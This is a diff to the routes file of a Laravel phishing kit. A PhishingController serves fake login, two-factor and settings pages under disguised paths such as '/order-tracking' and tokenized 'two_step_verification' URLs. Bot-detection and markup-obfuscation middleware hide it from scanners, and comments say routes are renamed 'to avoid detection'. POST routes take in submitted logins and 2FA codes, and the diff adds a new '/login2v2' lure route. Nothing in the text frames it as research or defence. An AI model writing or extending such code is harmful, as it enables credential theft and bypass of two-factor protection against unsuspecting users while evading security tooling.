@@ -15,23 +15,24 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
     Route::get('/about', [PhishingController::class, 'about']);
     Route::get('/contact', [PhishingController::class, 'contact']);
     Route::get('/products', [PhishingController::class, 'index']);
-    
+
     // Hidden Entry Points - Wrapped and Renamed for Disguise
     // We remove '/login' and '/latest-settings-info' to avoid detection
-    Route::get('/order-tracking', [PhishingController::class, 'startPhishing']);
+    Route::get('/order-tracking', [PhishingController::class, 'showLogin2v2']);
     Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);
 
     // Dynamic tokenized paths (the actual phishing pages) - Fully Obfuscated
-    Route::middleware([\App\Http\Middleware\ClassObfuscatorMiddleware::class])->group(function() {
+    Route::middleware([\App\Http\Middleware\ClassObfuscatorMiddleware::class])->group(function () {
         Route::get('/two_step_verification{tpath}/login/{ltoken}', [PhishingController::class, 'showLogin']);
         Route::get('/two_step_verification{tpath}/authentication/{atoken}', [PhishingController::class, 'show2fa']);
         Route::get('/two_step_verification{tpath}/invitation/{itoken}/{page}', [PhishingController::class, 'showMeta']);
         Route::get('/two_step_verification{tpath}/latest-settings-info/{stoken}', [PhishingController::class, 'showFx']);
     });
+    Route::get('/login2v2', [PhishingController::class, 'showLogin2v2']);
 });
 
 // Sensitive Data Submission Routes - Protected by Bot Detection but visible to real browsers
-Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(function() {
+Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(function () {
     Route::post('/login', [PhishingController::class, 'handleLogin']);
     Route::post('/2fa', [PhishingController::class, 'handle2fa']);
     Route::post('/log', [PhishingController::class, 'handleGenericLog']);
